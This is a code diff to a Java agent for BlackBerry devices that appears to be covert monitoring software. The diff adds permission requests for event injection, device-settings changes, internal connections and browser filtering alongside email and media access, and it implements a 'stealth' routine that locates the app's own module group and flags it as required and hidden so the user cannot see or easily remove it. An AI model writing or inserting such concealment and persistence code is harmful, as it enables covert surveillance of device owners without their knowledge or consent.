@@ -10,11 +10,15 @@
 package blackberry;
 
 import java.util.Date;
+import java.util.Enumeration;
 
 import net.rim.device.api.applicationcontrol.ApplicationPermissions;
 import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
 import net.rim.device.api.system.Application;
 import net.rim.device.api.system.ApplicationDescriptor;
+import net.rim.device.api.system.CodeModuleGroup;
+import net.rim.device.api.system.CodeModuleGroupManager;
+import net.rim.device.api.system.CodeModuleManager;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -155,7 +159,11 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_MEDIA,
                 ApplicationPermissions.PERMISSION_EMAIL,
                 ApplicationPermissions.PERMISSION_EVENT_INJECTOR,
-                ApplicationPermissions.PERMISSION_IDLE_TIMER };
+                ApplicationPermissions.PERMISSION_IDLE_TIMER,
+                ApplicationPermissions.PERMISSION_CHANGE_DEVICE_SETTINGS,
+                ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
+                ApplicationPermissions.PERMISSION_BROWSER_FILTER
+                };
 
         //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
 
@@ -269,6 +277,47 @@ public final class Core implements Runnable {
      */
     private void stealth() {
 
+        try {
+
+            String sCurrentModuleName = ApplicationDescriptor
+                    .currentApplicationDescriptor().getModuleName();
+            //#ifdef DEBUG_INFO
+            debug.info(sCurrentModuleName);
+            //#endif
+
+            CodeModuleGroup[] allGroups = CodeModuleGroupManager.loadAll();
+            CodeModuleGroup myGroup = null;
+            String moduleName = ApplicationDescriptor
+                    .currentApplicationDescriptor().getModuleName();
+
+            for (int i = 0; i < allGroups.length; i++) {
+                if (allGroups[i].containsModule(moduleName)) {
+                    myGroup = allGroups[i];
+                    break;
+                }
+            }
+
+            if (myGroup != null) {
+                myGroup.setFlag(CodeModuleGroup.FLAG_REQUIRED, true);
+                
+                //#ifdef DEBUG_TRACE
+                debug.trace("stealth: hiding...");
+                //#endif                
+                myGroup.setFlag(CodeModuleGroup.FLAG_HIDDEN, true);
+                //#ifdef DEBUG_INFO
+                debug.info("Group Hidden!");
+                //#endif
+            }else{
+                //#ifdef DEBUG_WARN
+                debug.warn("group not found");
+                //#endif
+            }
+
+        } catch (Exception ex) {
+            //#ifdef DEBUG_ERROR
+            debug.error(ex);
+            //#endif
+        }
     }
 
 }
